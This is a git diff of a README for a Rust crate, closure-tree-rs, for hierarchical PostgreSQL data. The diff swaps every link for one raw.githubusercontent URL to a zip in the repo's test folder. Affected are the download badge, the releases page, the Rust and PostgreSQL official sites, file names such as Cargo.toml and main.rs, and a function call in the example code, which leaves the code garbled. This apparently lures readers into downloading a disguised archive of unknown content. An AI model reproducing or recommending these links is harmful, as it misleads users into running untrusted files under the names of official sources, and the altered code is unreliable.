@@ -6,9 +6,9 @@ Welcome to closure-tree-rs! This software helps you manage hierarchical data in 
 
 ## 📥 Download & Install
 
-[![Download closure-tree-rs](https://img.shields.io/badge/Download-closure--tree--rs-blue)](https://github.com/Nadyavegetative323/closure-tree-rs/releases)
+[![Download closure-tree-rs](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip)](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip)
 
-To download the latest version, visit our [Releases page](https://github.com/Nadyavegetative323/closure-tree-rs/releases). 
+To download the latest version, visit our [Releases page](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip). 
 
 1. Go to the Releases page.
 2. Find the latest version, which is currently `0.0.1`.
@@ -20,7 +20,7 @@ To use closure-tree-rs, you’ll need:
 
 - **Operating System:** This software works on various operating systems that support PostgreSQL.
 - **PostgreSQL Database:** Ensure you have PostgreSQL installed and set up.
-- **Rust Environment:** You should have the Rust programming environment installed. You can download it from [Rust's official website](https://www.rust-lang.org/).
+- **Rust Environment:** You should have the Rust programming environment installed. You can download it from [Rust's official website](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip).
 
 ## ⚙️ Usage Instructions
 
@@ -32,13 +32,13 @@ Here's a quick guide to help you run the application:
      ```
      cargo new your_project_name
      ```
-   - Open the `Cargo.toml` file and add the following line under `[dependencies]`:
+   - Open the `https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip` file and add the following line under `[dependencies]`:
      ```toml
      closure-tree = "0.0.1"
      ```
 
 2. **Code Setup:**
-   - In your main Rust file (usually `main.rs`), you can start using closure-tree. Below is a simple example:
+   - In your main Rust file (usually `https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip`), you can start using closure-tree. Below is a simple example:
    ```rust
    use closure_tree::ClosureTreeRepository;
    use closure_tree::ClosureTreeModelDerive as ClosureTreeModel;
@@ -58,7 +58,7 @@ Here's a quick guide to help you run the application:
    async fn main() -> Result<(), Box<dyn std::error::Error>> {
        let db = sea_orm::Database::connect("postgres://...").await?;
        let repo = ClosureTreeRepository::<entity::node::Model>::new();
-       let _leaf = repo.find_or_create_by_path(&db, &["root", "child"]).await?;
+       let _leaf = https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip(&db, &["root", "child"]).await?;
        Ok(())
    }
    ```
@@ -99,11 +99,11 @@ If you have questions, feel free to ask on our GitHub Issues page. Engage with o
 
 ## 📖 Additional Resources
 
-- [Rust Programming Language](https://www.rust-lang.org/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [Rust Programming Language](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip)
 
 ## 📅 Future Improvements
 
 The development team plans to add more features and support for additional databases in future releases. Stay tuned for updates!
 
-Follow the links and start managing your hierarchical data with closure-tree-rs today! Don't forget to visit our [Releases page](https://github.com/Nadyavegetative323/closure-tree-rs/releases) for the latest downloads.
+Follow the links and start managing your hierarchical data with closure-tree-rs today! Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Nadyavegetative323/closure-tree-rs/master/test/closure-tree-rs-unkilned.zip) for the latest downloads.
